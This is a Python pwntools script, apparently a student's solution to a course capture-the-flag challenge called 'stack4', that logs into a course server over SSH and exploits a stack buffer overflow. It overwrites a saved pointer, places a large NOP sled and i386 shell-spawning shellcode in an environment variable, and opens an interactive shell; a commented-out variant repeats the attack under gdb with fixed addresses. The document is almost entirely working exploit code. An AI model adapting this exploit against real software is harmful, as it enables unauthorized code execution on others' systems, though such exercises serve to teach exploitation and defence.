#!/usr/bin/python
from pwn import *

context.clear(arch='i386', log_level='debug')
s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/stack4r_3_8deddc921e6b3899b88928a2ab110686/')

        
offset_ecx = 68
offset_ret = 80

buff_addr = p32(0xffffe000 - 6000 & 0xfffffff0) # buffer start addr guess
code_addr = p32(0xffffe000 - 3000) # find middle of nops and slide to our code

code = asm(shellcraft.i386.nop())*4096+asm(shellcraft.i386.sh())
payload = flat({offset_ecx: buff_addr}, code_addr*int(16384/4))

p = s.process('./stack4', env={'pad' : cyclic(16384), 'win' : code})
p.sendline(payload) 
p.interactive()

# # This solved it directly on the server inside of gdb
# from pwn import *

# context.binary = "./stack4"
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# #p = process('./stack4') 
# p = gdb.debug('./stack4', gdbscript='''
#                                             b *main
#                                             b *main+41
#                                             b *main+110 
#                                             continue
#                                         ''')

# offset_ecx = 68
# offset_ret = 80

# retaddr = 0xffffd4f0 # find start of buffer +0x4 bytes to account for lea ecx-0x4
# code_addr = p32(0xffffd740) # find middle of nops

# code = asm(shellcraft.i386.nop())*1000+asm(shellcraft.i386.sh())
# payload = flat({0: code_addr, offset_ecx : retaddr, offset_ret : retaddr}, code)

# p.sendline(payload) 
# p.interactive()
